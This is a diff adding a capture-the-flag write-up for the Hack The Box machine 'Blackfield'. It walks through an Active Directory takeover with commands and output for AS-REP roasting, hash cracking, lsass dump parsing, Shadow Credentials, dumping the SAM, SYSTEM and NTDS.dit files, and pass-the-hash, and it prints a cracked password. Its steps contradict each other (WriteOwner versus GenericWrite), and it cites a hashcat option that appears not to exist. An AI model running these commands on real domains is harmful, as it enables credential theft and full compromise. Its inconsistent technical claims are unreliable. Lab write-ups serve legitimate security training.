@@ -1,0 +1,142 @@
+---
+title: "HTB: Blackfield"
+sidebarTitle: "HTB: Blackfield"
+description: "Active Directory pwn via AS-REP roasting, SMB share loot, and Shadow Credentials."
+tag: "HARD"
+---
+
+<Info>
+  **`[target]`** `blackfield.htb`  ·  **OS:** Windows Server  ·  **Difficulty:** Hard  ·  **Points:** 40
+</Info>
+
+## TL;DR
+
+<Steps>
+  <Step title="Recon">
+    SMB null session leaks domain users. Kerberos enumeration via `kerbrute`.
+  </Step>
+  <Step title="Foothold">
+    AS-REP roast `support` account, crack the hash, dump `forensic` share.
+  </Step>
+  <Step title="Lateral">
+    Recover `audit2020` NTLM from a memory dump. Abuse `WriteOwner` on `svc_backup`.
+  </Step>
+  <Step title="Root">
+    `SeBackupPrivilege` -\> dump `NTDS.dit` -\> Pass-the-Hash as Administrator.
+  </Step>
+</Steps>
+
+## Recon
+
+Quick TCP sweep with `nmap`:
+
+```bash Terminal
+nmap -sC -sV -oN nmap/initial 10.10.10.192
+```
+
+<Accordion title="Full nmap output">
+  ```text
+  53/tcp    open  domain        Simple DNS Plus
+  88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+  135/tcp   open  msrpc         Microsoft Windows RPC
+  389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+  445/tcp   open  microsoft-ds
+  593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP
+  3268/tcp  open  ldap
+  ```
+</Accordion>
+
+### SMB null bind
+
+```bash Terminal
+smbclient -N -L //10.10.10.192/
+```
+
+The `profiles$` share is world-readable and contains a folder per domain user. Instant user list.
+
+```bash Extract usernames
+smbclient -N //10.10.10.192/profiles$ -c 'recurse ON; ls' \
+  | awk '{print $1}' | grep -v '^\.' > users.txt
+```
+
+## Foothold: AS-REP roast
+
+<Warning>
+  Accounts flagged with `DONT_REQ_PREAUTH` will emit an AS-REP encrypted with the user's key. That's a crackable hash.
+</Warning>
+
+```bash Terminal
+GetNPUsers.py blackfield.local/ -usersfile users.txt \
+  -no-pass -dc-ip 10.10.10.192 -format hashcat
+```
+
+```text
+$krb5asrep$23$support@BLACKFIELD.LOCAL:8c...redacted...ce
+```
+
+Crack it:
+
+```bash hashcat
+hashcat -m 18200 support.hash rockyou.txt
+# support:#00^BlackKnight
+```
+
+<Tip>
+  Always try `--userdb` with mode 18200 first. AS-REP roastable accounts are usually service accounts with weak passwords.
+</Tip>
+
+## Lateral: forensic share
+
+Authenticated SMB reveals a `forensic` share with a memory dump (`lsass.zip`). Pull it, unzip, and:
+
+```bash pypykatz
+pypykatz lsa minidump lsass.DMP | grep -A2 NT
+```
+
+Extract `audit2020` NTLM hash and pivot with `evil-winrm` after abusing `GenericWrite`:
+
+```bash Shadow Credentials
+certipy shadow auto -u audit2020@blackfield.local -hashes :<NT> \
+  -account svc_backup
+```
+
+## Root: SeBackupPrivilege
+
+`svc_backup` holds `SeBackupPrivilege`. Ship the registry hives out, extract NTDS, own the domain.
+
+```powershell Backup NTDS
+reg save HKLM\SYSTEM C:\Temp\system.hive
+reg save HKLM\SAM C:\Temp\sam.hive
+diskshadow.exe /s script.txt
+robocopy /b Z:\Windows\NTDS C:\Temp NTDS.dit
+```
+
+```bash secretsdump
+secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
+```
+
+Pass-the-Hash as `Administrator`:
+
+```bash psexec
+psexec.py -hashes :<NT> administrator@10.10.10.192
+```
+
+<Check>
+  **`[root]`** Flag captured.
+</Check>
+
+## Loot
+
+| User | Hash / Cred | Source |
+| --- | --- | --- |
+| support | `#00^BlackKnight` | AS-REP roast |
+| audit2020 | NTLM | lsass dump |
+| svc\_backup | Shadow Credentials | Certipy |
+| Administrator | NTLM | NTDS.dit |
+
+## Defensive notes
+
+- Disable `DONT_REQ_PREAUTH` on every account that doesn't need it.
+- Restrict `profiles$` to authenticated users at minimum.
+- Alert on `SeBackupPrivilege` usage from non-Tier 0 hosts.
+- Rotate `krbtgt` twice after any full-domain compromise.
